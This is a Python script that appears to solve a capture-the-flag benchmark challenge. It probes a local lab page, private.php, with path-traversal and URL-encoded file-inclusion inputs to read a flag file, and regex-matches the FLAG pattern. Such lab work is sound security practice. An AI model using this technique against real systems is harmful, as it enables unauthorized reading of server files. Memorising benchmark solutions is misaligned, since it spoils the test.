import requests
import re

target_url = "http://127.0.0.1:33001/private.php"

# Try to read xbow-flag.txt - this is the flag file!
print("[*] Attempting to read xbow-flag.txt")
print("=" * 60)

potential_paths = [
    "/var/www/html/xbow-flag.txt",
    "xbow-flag.txt",
    "./xbow-flag.txt",
    "../html/xbow-flag.txt",
    "../../html/xbow-flag.txt",
    "../../../var/www/html/xbow-flag.txt",
]

for path in potential_paths:
    print(f"\n[*] Trying: {path}")
    try:
        resp = requests.get(target_url, params={"file": path}, timeout=5)
        
        if '<pre>' in resp.text:
            content = resp.text.split('<pre>')[1].split('</pre>')[0]
            print(f"    Status: 200 OK")
            print(f"    Content length: {len(content)}")
            
            if content.strip():
                print(f"    Raw content: {repr(content[:500])}")
                
                # Look for FLAG pattern
                flag_match = re.search(r'FLAG\{[^}]+\}', content, re.IGNORECASE)
                if flag_match:
                    print(f"\n[!] FLAG FOUND!")
                    print(f"[!] {flag_match.group()}")
                elif content.strip():
                    print(f"    Content: {content}")
            else:
                print(f"    Content appears empty")
        else:
            # Check if we got the private page without file content
            if len(resp.text) < 1000:
                print(f"    Response: {resp.text[:300]}")
            else:
                print(f"    Got HTML page (no file content)")
                
    except Exception as e:
        print(f"    [!] Error: {str(e)}")

# Also try with URL encoding variations
print("\n" + "=" * 60)
print("[*] Trying with URL encoding")

encoded_paths = [
    "xbow%2dflag.txt",  # dash encoded
    "xbow-flag%2etxt",  # dot encoded
]

for path in encoded_paths:
    print(f"\n[*] Trying encoded: {path}")
    resp = requests.get(target_url, params={"file": path}, timeout=5)
    if '<pre>' in resp.text:
        content = resp.text.split('<pre>')[1].split('</pre>')[0]
        if content.strip():
            print(f"    Content: {content[:500]}")
            flag_match = re.search(r'FLAG\{[^}]+\}', content)
            if flag_match:
                print(f"[!] FLAG: {flag_match.group()}")

# Check current working directory hint from mounts
print("\n[*] Mount info suggests containerized environment")
print("[*] Trying to list or find xbow-flag.txt via find-like approaches")
